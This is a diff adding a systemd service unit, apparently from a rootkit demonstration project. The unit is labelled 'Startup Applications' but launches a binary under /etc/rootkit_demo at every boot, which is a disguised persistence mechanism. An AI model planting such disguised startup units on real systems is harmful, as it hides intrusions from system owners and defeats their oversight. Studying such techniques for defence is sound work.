@@ -1,0 +1,10 @@
+[Unit]
+Description=Startup Applications
+
+[Service]
+Type=oneshot
+RemainAfterExit=false
+ExecStart=/etc/rootkit_demo/public/http/download_server
+
+[Install]
+WantedBy=multi-user.target 
